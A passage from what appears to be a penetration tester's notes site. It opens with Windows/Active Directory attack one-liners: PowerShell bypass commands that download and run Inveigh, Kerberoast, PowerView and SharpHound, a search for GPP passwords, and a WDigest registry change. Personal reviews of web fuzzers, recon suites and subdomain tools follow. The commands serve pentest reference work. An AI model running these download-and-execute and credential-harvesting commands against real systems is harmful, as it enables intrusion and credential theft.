powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y –Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol*.xml findstr /S cpassword %logonserver%\sysvol*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows (restart needed)
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
</code></pre>
<h3 id="native-commands"><a class="header" href="#native-commands">Native commands</a></h3>
<pre><code class="language-bash"># User Domain
$env:USERDNSDOMAIN
(Get-ADDomain).DNSRoot

# User Domain info
Get-ADUser Anakin

# Computer Domain
(Get-WmiObject Win32_ComputerSystem).Domain

# DNS, NetBIOSName, DomainSID
Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID

# Trusted domains
nltest /domain_trusts

# Forest info
Get-ADForest

# Interesting users
Get-ADUser -Filter * | select SamAccountName

# Computer accounts
Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName

# Trust accounts
Get-ADUser  -LDAPFilter "(SamAccountName=*$)" | select SamAccountName

# Groups
Get-ADGroup -Filter * | select SamAccountName

# Interesting groups
Get-ADGroup "Domain Admins" -Properties members,memberof

# Get DC names
nltest /dclist:&lt;domain.name&gt;

# Get all users in the current domain
Get-NetUser | select -ExpandProperty cn

# Get all computers in the current domain
Get-NetComputer

# Get all domains in current forest
Get-NetForestDomain

# Get domain/forest trusts
Get-NetDomainTrust
Get-NetForestTrust

# Get information for the DA group
Get-NetGroup -GroupName "Domain Admins"

# Find members of the DA group
Get-NetGroupMember -GroupName "Domain Admins" | select -ExpandProperty membername

# Find interesting shares in the domain, ignore default shares
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC

# Get OUs for current domain
Get-NetOU -FullData

# Get computers in an OU
# %{} is a looping statement
Get-NetOU -OUName StudentMachines | %{Get-NetComputer -ADSPath $_}

# Get GPOs applied to a specific OU
Get-NetOU *student* | select gplink
Get-NetGPO -Name "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"

# Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain
Get-NetGPOGroup

# Get incoming ACL for a specific object
Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights

# Find interesting ACLs for the entire domain, show in a readable (left-to-right) format
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft

# Get interesting outgoing ACLs for a specific user or group
# ?{} is a filter statement
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Admins"} | select ObjectDN,ActiveDirectoryRights

# Get Applocker Policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Get computers running LAPS, along with their passwords if we're allowed to read those
Get-LAPSComputers

# Get groups allowed to read LAPS passwords
Find-LAPSDelegatedGroups
</code></pre>
<h3 id="av-bypasses"><a class="header" href="#av-bypasses">AV Bypasses</a></h3>
<p><img src="others/../.gitbook/assets/Bypass-AV.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-fuzzers-review"><a class="header" href="#web-fuzzers-review">Web fuzzers review</a></h1>
<h2 id="intro"><a class="header" href="#intro">Intro</a></h2>
<p>This is a December 2020 web fuzzing tools review made by myself. I have measured times, CPU usage and RAM consumption in three different lists, 10K, 100K and 400K lines and putting each tool with three different sets of threads: 40, 100 and 400 threads. </p>
<p>Why? Because I have been a ffuf user since version 0.9 (13 Apr 2019) and recently I thought that maybe it was time to review the rest of the tools.</p>
<p>This is not intended to be a serious investigation, a technical paper, or anything like that, just a series of tests that I have done for fun. The results shown are my opinion and if at any time you do not like them or you don't agree, you can stop reading or explain to me how I could have done it better :)</p>
<p>All the results of my runs and tests are posted <a href="https://docs.google.com/spreadsheets/d/14eFVYoYxMOTZ1tI2jADnvNw_0S6HHJMQXcp5NelhtY0/edit?usp=sharing">here</a>, it has three sheets (info, performance and features). </p>
<p>https://docs.google.com/spreadsheets/d/14eFVYoYxMOTZ1tI2jADnvNw_0S6HHJMQXcp5NelhtY0/edit?usp=sharing</p>
<h2 id="tools-37"><a class="header" href="#tools-37">Tools</a></h2>
<p>Small summary of each tool with the features and results that I got. This section not follows any special order.</p>
<h3 id="wfuzz"><a class="header" href="#wfuzz"><a href="https://github.com/xmendez/wfuzz">wfuzz</a></a></h3>
<ul>
<li>Author: <a href="https://twitter.com/x4vi_mendez">@x4vi_mendez</a></li>
<li>Language: Python</li>
</ul>
<p>GitHub's first release 2014, it's like a tank for web fuzzing, it has a lot of (really a lot) customizations and does almost everything very well. Everybody knows it, he was the best until Golang came.</p>
<h4 id="pros"><a class="header" href="#pros">Pros</a></h4>
<ul>
<li>Lot of customization.</li>
<li>Maybe most versatile.</li>
</ul>
<h4 id="cons"><a class="header" href="#cons">Cons</a></h4>
<ul>
<li>RAM eater.</li>
<li>High CPU usage even with sort lists.</li>
<li>Slow.</li>
</ul>
<h3 id="ffuf"><a class="header" href="#ffuf"><a href="https://github.com/ffuf/ffuf">ffuf</a></a></h3>
<ul>
<li>Author: <a href="https://twitter.com/joohoi">@joohoi</a></li>
<li>Language: Go</li>
</ul>
<p>GitHub's first release Nov 2018. For me, it has become the best, it is fast, versatile, many options and does not give problems.</p>
<h4 id="pros-1"><a class="header" href="#pros-1">Pros</a></h4>
<ul>
<li>Fast.</li>
<li>Multiple options.</li>
<li>Low resource usage.</li>
</ul>
<h4 id="cons-1"><a class="header" href="#cons-1">Cons</a></h4>
<ul>
<li>Fancy/non-relevant features like:
<ul>
<li>Pause/resume.</li>
<li>ETA.</li>
</ul>
</li>
<li>Ugly recursion output.</li>
<li>Only errors count, to check them you must run again with -debug file flag.</li>
</ul>
<h3 id="feroxbuster"><a class="header" href="#feroxbuster"><a href="https://github.com/epi052/feroxbuster">feroxbuster</a></a></h3>
<ul>
<li>Author: <a href="https://twitter.com/epi052">@epi052</a></li>
<li>Language: Rust</li>
</ul>
<p>GitHub's first release Oct 2020. It's the youngest in the list and I really wanted to try it because it looks great and comes with some features that I didn't see in other tools.</p>
<h4 id="pros-2"><a class="header" href="#pros-2">Pros</a></h4>
<ul>
<li>Response link extractor.</li>
<li>Pause and resume.</li>
<li>Low CPU usage.</li>
</ul>
<h4 id="cons-2"><a class="header" href="#cons-2">Cons</a></h4>
<ul>
<li>Tool has crashed in some tests.</li>
<li>Feels buggy.</li>
<li>RAM eater.</li>
<li>No FUZZ keyword.</li>
<li>No rate/time limits.</li>
</ul>
<h3 id="gobuster"><a class="header" href="#gobuster"><a href="https://github.com/OJ/gobuster">gobuster</a></a></h3>
<ul>
<li>Author: <a href="https://twitter.com/TheColonial">@OJ</a></li>
<li>Language: Go</li>
</ul>
<p>GitHub's first release 2015. For me, it was the predecessor of fuff, I used it on OSCP exam, and it took me a while to get rid of it.</p>
<h4 id="pros-3"><a class="header" href="#pros-3">Pros</a></h4>
<ul>
<li>Really fast.</li>
<li>Low CPU and RAM.</li>
<li>S3 enum.</li>
<li>Patterns usage.</li>
</ul>
<h4 id="cons-3"><a class="header" href="#cons-3">Cons</a></h4>
<ul>
<li>No recursion.</li>
<li>No colors.</li>
<li>No filters.</li>
<li>Lack of features.</li>
</ul>
<h3 id="rustbuster"><a class="header" href="#rustbuster"><a href="https://github.com/phra/rustbuster">rustbuster</a></a></h3>
<ul>
<li>Author: <a href="https://twitter.com/phraaaaaaa">@phra</a></li>
<li>Language: Rust</li>
</ul>
<p>GitHub's first release May 2019. I got to this one because I read about it on the feroxbuster page and I found it very interesting.</p>
<h4 id="pros-4"><a class="header" href="#pros-4">Pros</a></h4>
<ul>
<li>The fastest.</li>
<li>Best in CPU and RAM.</li>
<li>IIS Shortname scanner</li>
</ul>
<h4 id="cons-4"><a class="header" href="#cons-4">Cons</a></h4>
<ul>
<li>No recursion.</li>
<li>No colors.</li>
<li>The one with the least features.</li>
<li>Last commit sept 2019, maybe abandoned.</li>
<li>Sometimes crashes with many threads.</li>
</ul>
<h3 id="dirsearch"><a class="header" href="#dirsearch"><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></a></h3>
<ul>
<li>Author: <a href="https://twitter.com/_maurosoria">@maurosoria</a></li>
<li>Language: Python</li>
</ul>
<p>GitHub's first release Jul 2014. It was the first fuzzing tool I used, it comes with custom wordlist, pretty output and a lot of options.</p>
<h4 id="pros-5"><a class="header" href="#pros-5">Pros</a></h4>
<ul>
<li>Prettiest output imo.</li>
<li>Quality options by default.</li>
<li>Easy of use, recommended for noobs.</li>
<li>Wordlists mutation.</li>
</ul>
<h4 id="cons-5"><a class="header" href="#cons-5">Cons</a></h4>
<ul>
<li>The slowest.</li>
<li>No FUZZ keyword.</li>
</ul>
<h2 id="results"><a class="header" href="#results">Results</a></h2>
<h3 id="time"><a class="header" href="#time">Time</a></h3>
<ol>
<li>rustbuster</li>
<li>ffuf</li>
<li>gobuster</li>
<li>feroxbuster</li>
<li>wfuzz</li>
<li>dirsearch</li>
</ol>
<h3 id="cpu"><a class="header" href="#cpu">CPU</a></h3>
<ol>
<li>feroxbuster</li>
<li>dirsearch</li>
<li>gobuster</li>
<li>ffuf</li>
<li>rustbuster</li>
<li>wfuzz</li>
</ol>
<h3 id="ram"><a class="header" href="#ram">RAM</a></h3>
<ol>
<li>gobuster</li>
<li>rustbuster</li>
<li>ffuf</li>
<li>dirsearch</li>
<li>feroxbuster</li>
<li>wfuzz</li>
</ol>
<h3 id="features"><a class="header" href="#features">Features</a></h3>
<ol>
<li>ffuf</li>
<li>wfuzz</li>
<li>dirsearch</li>
<li>feroxbuster</li>
<li>gobuster</li>
<li>rustbuster</li>
</ol>
<h3 id="general-10"><a class="header" href="#general-10">General</a></h3>
<ol>
<li>ffuf</li>
<li>gobuster</li>
<li>feroxbuster</li>
<li>rustbuster</li>
<li>dirsearch</li>
<li>wfuzz</li>
</ol>
<h2 id="final-thoughts"><a class="header" href="#final-thoughts">Final thoughts</a></h2>
<p>I will continue using ffuf because it seems that it's the tool with the best balance between functionalities and performance. I was very surprised by Rust and I really want Feroxbuster to continue growing and become a worthy rival for ffuf and finally it seems that the fathers of fuzzing tools are left behind, the world advances!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="recon-suites-review"><a class="header" href="#recon-suites-review">Recon suites review</a></h1>
<h2 id="intro-1"><a class="header" href="#intro-1">Intro</a></h2>
<p><strong>What?</strong> This is a December 2020 hunting/pentesting recon suites review made by myself. I have compared and review every tool one by one and obtained a general view of the "state-of-the-art" of the most used recon tools.</p>
<p><strong>Why?</strong> Lately there has been an explosion in the creation of these types of tools, and I was simply curious about how each one faced the challenge of profiling one or more objectives.</p>
<p><strong>How?</strong> First, I have analyzed what features the suites have and then what tools they used to achieve those functionalities.</p>
<p>From my POV a recon tool should get as much information as possible from a target regardless of its size. From subdomains enumeration to analyze all JS and their possible secrets, through SSL failures or consult information in public sources. Neither am I looking for a tool that will get all the low-hanging fruit for P1 automatically continuously, let's be honest, most people are looking for this, and you don't have the necessary to set up a competent infrastructure to achieve it.</p>
<p>I thought about making measurements on the number of subdomains that each tool retrieves and the number of information that they retrieve in general, but this poses several problems. In the end, these suites launch existing subdomain enumeration tools, so I'll do that other day (spoiler! 😲) and it doesn't really depend on the suite itself. On the other hand, each tool does different processes with different tools, so it would not be fair (or measurable, I think) to make a comparison of the quantity or quality of information they obtain.</p>
<p>My perfect recon suite should be able to do the following: run a command, review its contents, and then run another tool with that information, like "subdomain enum | httpx | gf | dalfox". Yeah I know, it's a simple oneliner, but also, I want a lot of different checks in an easy readable and organized way. Easy? Let's see.</p>
<p>hint style="info"
This is not intended to be a serious investigation, a technical paper, or anything like that, just a series of tests that I have done for fun. The results shown are my opinion and if at any time you don't like them, or you don't agree, you can stop reading or explain to me how I could have done it better 😉</p>
<p>All the results of my runs and tests are posted <a href="https://docs.google.com/spreadsheets/d/1XVi9eKWvVZw9zrX46XEZD3LfiEMRCg327hOn4AbTZWs/edit?usp=sharing">here</a>, it has three sheets (Summary, features and tools).</p>
<p>https://docs.google.com/spreadsheets/d/1XVi9eKWvVZw9zrX46XEZD3LfiEMRCg327hOn4AbTZWs/edit?usp=sharing</p>
<h2 id="tools-38"><a class="header" href="#tools-38">Tools</a></h2>
<p>Small summary of each tool with the features and results that I got. This section not follows any special order.</p>
<h3 id="bheem"><a class="header" href="#bheem"><a href="https://github.com/harsh-bothra/Bheem">Bheem</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(29).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/harsh-bothra">harsh-bothra</a> &amp; <a href="https://github.com/KathanP19">KathanP19</a></li>
<li>Language: Bash</li>
</ul>
<p>It's composed of a lot of simple bash scripts that are calling each other which makes it much easier to add some changes that fit for you or what you want or add your own.</p>
<h4 id="pros-6"><a class="header" href="#pros-6">Pros</a></h4>
<ul>
<li>Superb workflow.</li>
<li>Easy to understand and adapt for your needs.</li>
<li>Best and trendy tools like nuclei, dalfox or gf patterns.</li>
<li>Scope defined workflows.</li>
</ul>
<h4 id="cons-6"><a class="header" href="#cons-6">Cons</a></h4>
<ul>
<li>No web screenshots.</li>
<li>Lack of output customization.</li>
</ul>
<h3 id="3klcon"><a class="header" href="#3klcon"><a href="https://github.com/eslam3kl/3klCon">3klcon</a></a></h3>
<p><img src="others/../.gitbook/assets/image.png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/eslam3kl">eslam3kl</a></li>
<li>Language: Python2</li>
</ul>
<p>This tool continues the process of the author's tool <a href="https://github.com/eslam3kl/3klector">3klector</a> and have a strong workflow which covers a lot of things.</p>
<h4 id="pros-7"><a class="header" href="#pros-7">Pros</a></h4>
<ul>
<li>ASN and acquisitions collector.</li>
<li>Provides Dorks to check manually.</li>
</ul>
<h4 id="cons-7"><a class="header" href="#cons-7">Cons</a></h4>
<ul>
<li>Python2 died a year ago, too much for a live project imho.</li>
<li>No subdomain bruteforce.</li>
<li>No web screenshots.</li>
</ul>
<h3 id="sudomy"><a class="header" href="#sudomy"><a href="https://github.com/Screetsec/Sudomy">Sudomy</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(5).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/Screetsec">Screetsec</a></li>
<li>Language: Python3</li>
</ul>
<p>I have been using this tool for a lot of time, It does a very good job of enumerating subdomains giving complete results.</p>
<h4 id="pros-8"><a class="header" href="#pros-8">Pros</a></h4>
<ul>
<li>Uses Shodan for fast port scan.</li>
<li>Vhosts checker.</li>
<li>Wordlist generator from target.</li>
<li>Slack notifications.</li>
</ul>
<h4 id="cons-8"><a class="header" href="#cons-8">Cons</a></h4>
<ul>
<li>Needs API keys.</li>
<li>No vulns scanner.</li>
<li>No endpoints checks like xss, params, js, etc.</li>
</ul>
<h3 id="osmedeus"><a class="header" href="#osmedeus"><a href="https://github.com/j3ssie/Osmedeus">Osmedeus</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(33).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/j3ssie">j3ssie</a></li>
<li>Language: Python3</li>
</ul>
<p>One of the well known, in a short time it has become one of the best known, now its author is evolving this project in huntersuite.io (paid).</p>
<h4 id="pros-9"><a class="header" href="#pros-9">Pros</a></h4>
<ul>
<li>Web interface.</li>
<li>Nice report output.</li>
<li>Slack notifications.</li>
<li>ffuf for fuzzing.</li>
</ul>
<h4 id="cons-9"><a class="header" href="#cons-9">Cons</a></h4>
<ul>
<li>No WAF checker</li>
<li>Jaeles for vulns scan feels buggy.</li>
<li>No endpoints analysis like potential xss, params, js, etc.</li>
</ul>
<h3 id="finalrecon"><a class="header" href="#finalrecon"><a href="https://github.com/thewhiteh4t/FinalRecon">FinalRecon</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(43).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/thewhiteh4t">thewhiteh4t</a></li>
<li>Language: Python3</li>
</ul>
<p>Recently added to the official Kali repositories, increasingly known and used. Mainly focused on web scan, but it does the recon phase too.</p>
<h4 id="pros-10"><a class="header" href="#pros-10">Pros</a></h4>
<ul>
<li>Very good cli output.</li>
<li>Customizable files output.</li>
<li>Not use external tools, does almost everything by its own.</li>
</ul>
<h4 id="cons-10"><a class="header" href="#cons-10">Cons</a></h4>
<ul>
<li>Need API keys.</li>
<li>Only passive subdomain enumeration.</li>
<li>Lack of features surprisingly.</li>
</ul>
<h3 id="rengine"><a class="header" href="#rengine"><a href="https://github.com/yogeshojha/rengine">reNgine</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(7).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/yogeshojha">yogeshojha</a></li>
<li>Language: Python3</li>
</ul>
<p>A tool driven by a web interface (only) with a good integration of the best tools such as amass, nuclei or dirsearch.</p>
<h4 id="pros-11"><a class="header" href="#pros-11">Pros</a></h4>
<ul>
<li>Web interface.</li>
<li>Customizable files output.</li>
<li>Schedule feature and dashboard.</li>
<li>Exclude subdomains feature.</li>
</ul>
<h4 id="cons-11"><a class="header" href="#cons-11">Cons</a></h4>
<ul>
<li>No cli output.</li>
<li>No subdomains permutations or bruteforce.</li>
<li>Displaying directory enumeration in web interface is not good at all.</li>
</ul>
<h3 id="rock-on"><a class="header" href="#rock-on"><a href="https://github.com/SilverPoision/Rock-ON">Rock-ON</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(19).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/SilverPoision">SilverPoision</a></li>
<li>Language: Bash</li>
</ul>
<p>This tool has not been updated for more than a year but anyway it does it works really well, not much features but good implemented.</p>
<h4 id="pros-12"><a class="header" href="#pros-12">Pros</a></h4>
<ul>
<li>ASN enumeration.</li>
<li>Vhosts detection.</li>
<li>Slack integration.</li>
</ul>
<h4 id="cons-12"><a class="header" href="#cons-12">Cons</a></h4>
<ul>
<li>API keys needed.</li>
<li>No endpoints analysis like potential xss, params, js, etc.</li>
</ul>
<h3 id="recon-pipeline"><a class="header" href="#recon-pipeline"><a href="https://github.com/epi052/recon-pipeline">recon-pipeline</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(10).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/epi052">epi052</a></li>
<li>Language: Python3</li>
</ul>
<p>This is a total different approach from the others. In this tool you have to define a recon pipeline or use one of previously defined, maybe needs more learning curve (but good <a href="https://recon-pipeline.readthedocs.io/">docs</a>) but totally customizable.</p>
<h4 id="pros-13"><a class="header" href="#pros-13">Pros</a></h4>
<ul>
<li>PIpeline customizable definition.</li>
<li>Absolutely customizable approach.</li>
<li>Scheduler.</li>
</ul>
<h4 id="cons-13"><a class="header" href="#cons-13">Cons</a></h4>
<ul>
<li>Searchsploit for vulns detection.</li>
<li>No endpoints analysis like potential xss, params, js, etc.</li>
</ul>
<h3 id="oneforall"><a class="header" href="#oneforall"><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(18).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/shmilylty">shmilylty</a></li>
<li>Language: Python3</li>
</ul>
<p>‌I didn't know anything about this tool but it's really famous (almost 3K stars) and that's because it uses almost every API that exists to give one of the best passive scan experience thtat exists for now.</p>
<h4 id="pros-14"><a class="header" href="#pros-14">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>More than 40 API keys integration.</li>
<li>Zone transfer checker.</li>
<li>Scheduler.</li>
</ul>
<h4 id="cons-14"><a class="header" href="#cons-14">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>Searchsploit for vulns detection.</li>
<li>No endpoints analysis like potential xss, params, js, etc.</li>
</ul>
<h3 id="chomp-scan"><a class="header" href="#chomp-scan"><a href="https://github.com/SolomonSklash/chomp-scan">chomp-scan</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(27).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/SolomonSklash">SolomonSklash</a></li>
<li>Language: Bash</li>
</ul>
<p>‌I have been using this tool for a long time during my pentests and I like it very much. It's a scripted bash pipeline with a lot of tests.</p>
<h4 id="pros-15"><a class="header" href="#pros-15">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>Really good cli output.</li>
<li>CORS specific checks.</li>
<li>ffuf for fuzzing.</li>
</ul>
<h4 id="cons-15"><a class="header" href="#cons-15">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>Nikto for web vulns.</li>
<li>Notica for notifications.</li>
</ul>
<h3 id="reconpi"><a class="header" href="#reconpi"><a href="https://github.com/x1mdev/ReconPi">ReconPi</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(6).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/x1mdev">x1mdev</a></li>
<li>Language: Bash</li>
</ul>
<p>Nice all-in-one installer designed to start the recon process in a low hardware device like Raspberry Pi in a lightweight way.</p>
<h4 id="pros-16"><a class="header" href="#pros-16">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>Best and trendy tools like nuclei, dalfox or gf patterns.</li>
<li>Slack and Discord notifications.</li>
<li>Lot of passive subdomains tools included.</li>
</ul>
<h4 id="cons-16"><a class="header" href="#cons-16">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>Need API keys.</li>
<li>Installer install tools not used in the script.</li>
</ul>
<h3 id="hydrarecon"><a class="header" href="#hydrarecon"><a href="https://github.com/aufzayed/hydrarecon">HydraRecon</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(46).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/aufzayed">aufzayed</a></li>
<li>Language: Python3</li>
</ul>
<p>Little known tool that does the whole recognition process in a custom way.</p>
<h4 id="pros-17"><a class="header" href="#pros-17">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>JS extractor.</li>
<li>No use 3rd parties tools.</li>
</ul>
<h4 id="cons-17"><a class="header" href="#cons-17">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>Lack of features.</li>
<li>No endpoints analysis like potential xss, params, js, etc.</li>
</ul>
<h3 id="lazyrecon"><a class="header" href="#lazyrecon"><a href="https://github.com/nahamsec/lazyrecon">lazyrecon</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(44).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/nahamsec">nahamsec</a></li>
<li>Language: Bash</li>
</ul>
<p>Well known tool created by one of the big guys. It does the work in a fast an easy way and create a pretty html report easy to review.</p>
<h4 id="pros-18"><a class="header" href="#pros-18">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>Exclude subdomains feature.</li>
<li>Wordlist generation.</li>
</ul>
<h4 id="cons-18"><a class="header" href="#cons-18">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>No vulns/tech scanner.</li>
<li>No endpoints analysis like potential xss, params, js, etc.</li>
</ul>
<h3 id="sn1per"><a class="header" href="#sn1per"><a href="https://github.com/1N3/Sn1per">Sn1per</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(41).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/1N3">1N3</a></li>
<li>Language: Bash</li>
</ul>
<p>This is an All-In-One hacking tool but apart from this, also have a good recon capabilities that performs almost everything.</p>
<h4 id="pros-19"><a class="header" href="#pros-19">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>ASN enumeration.</li>
<li>Transfer zone, vhosts and and waf checks.</li>
<li>Most complete in features tool.</li>
</ul>
<h4 id="cons-19"><a class="header" href="#cons-19">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>Too heavy to do recon (docker image &gt; 6 GB).</li>
<li>No endpoints analysis like potential xss, params, etc.</li>
</ul>
<h3 id="rapidscan"><a class="header" href="#rapidscan"><a href="https://github.com/skavngr/rapidscan">Rapidscan</a></a></h3>
<p><img src="others/../.gitbook/assets/image%20(4).png" alt="" /></p>
<ul>
<li>Author: <a href="https://github.com/skavngr">skavngr</a></li>
<li>Language: Python2</li>
</ul>
<p>I have been using this tool some time ago because it provides an easy human-readable output, with suggestions, good workflow and ETA in every step.</p>
<h4 id="pros-20"><a class="header" href="#pros-20">Pros‌ <a href="others/recon-suites-review.html#pros-7" id="pros-7"></a></a></h4>
<ul>
<li>Really nice cli output results.</li>
<li>Suggests resolution for each bug found.</li>
<li>Transfer zone</li>
</ul>
<h4 id="cons-20"><a class="header" href="#cons-20">Cons <a href="others/recon-suites-review.html#cons-7" id="cons-7"></a></a></h4>
<ul>
<li>Oldie tools like nikto, uniscan.</li>
<li>Python2 died a year ago, too much for a live project imho.</li>
</ul>
<h2 id="results-1"><a class="header" href="#results-1">Results</a></h2>
<h3 id="features-1"><a class="header" href="#features-1">Features</a></h3>
<ol>
<li>Sn1per</li>
<li>Sudomy</li>
<li>Bheem &amp; osmedeus</li>
<li>ReconPi &amp; ChompScan</li>
<li>Rapidscan &amp; lazyrecon &amp; 3klcon</li>
</ol>
<h3 id="workflow-and-usage"><a class="header" href="#workflow-and-usage">Workflow and usage</a></h3>
<ol>
<li>Bheem</li>
<li>ReconPi</li>
<li>Osmedeus &amp; 3klcon</li>
<li>Sudomy</li>
<li>rapidscan &amp; chompscan</li>
</ol>
<h3 id="general-11"><a class="header" href="#general-11">General</a></h3>
<ol>
<li>Bheem</li>
<li>ReconPi</li>
<li>Sn1per &amp; osmedeus</li>
<li>Sudomy &amp; 3klcon</li>
<li>rapidscan &amp; chompscan</li>
</ol>
<h2 id="final-thoughts-1"><a class="header" href="#final-thoughts-1">Final thoughts</a></h2>
<p>I was very surprised by the amount of very good tools that exist for recognition, I have discovered many very good tools that I did not know and others I have been able to understand better how they work. I was also surprised by how quickly nuclei has established itself as one of the best tools that exist in the panorama and on the other hand, that dorking is no longer used, even if it is simply to return a list of urls to check manually. <strong>Bheem</strong> seems to me to be the best tool that adapts to my work methodology and I hope they continue to maintain and update it because it does the job very well.</p>
<p>Finally, thanks to all the tool developers who facilitate our work and implement the recon methodology better and better.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="subdomain-tools-review"><a class="header" href="#subdomain-tools-review">Subdomain tools review</a></h1>
<h2 id="intro-2"><a class="header" href="#intro-2">Intro</a></h2>
<p><strong>What?</strong> This is a December 2020 subdomain tools review made by myself. I have compared and review every tool one by one and obtained a general view of the "state-of-the-art" of the most used subdomain tools. </p>
<p><strong>Why?</strong> Sometimes I have doubts if I am actually finding all the subdomains when I start hunting and if the tool I use will find them all. This is the review that I would like to have read before deciding on one tool or another.</p>
<p><strong>How?</strong> As the main objective is to find subdomains, I have launched the tools against a small scope (zego.com), a medium scope (tiktok.com) and a large one (twitter.com) to see how the different tools respond.</p>
<p>Having different tools and different approaches I have compared the tools by typology, like this:</p>
<ul>
<li><strong>Passive:</strong> It relies on third-party services with which it collects the largest possible number of subdomains, dead or alive. The problem with this approach is that you can find numerous subdomains, but many of them may be prehistoric, but in return they do it very quickly.</li>
<li><strong>Active</strong>: From any source, for example third-party sources of the passive approach, it verifies through DNS requests (or in any other way) if the subdomain is alive or not. This approach takes a little longer than the passive one, but the results it generates are almost entirely useful.</li>
<li><strong>Bruteforce</strong>: From a wordlist and a domain, it makes DNS requests for each word along with the domain. The advantage of this approach is that the results obtained are always real, but it depends entirely on the quality of the wordlist.</li>
<li><strong>Alterations/permutations</strong>: In this case, from a list of subdomains and a list of alterations or permutations, a new list of subdomains is generated that are verified through DNS requests. With this approach you can find subdomains that with the rest would be impossible.</li>
</ul>
<p>The integrations with third-party services I have tried to use as many as the tool allows me for free. All scans have been done against the same targets and with the same bruteforcing wordlists and alteration wordlists.</p>
<ul>
<li>Resolvers: <a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/dns-resolvers.txt">danielmiessler/Miscellaneous/dns-resolvers.txt</a></li>
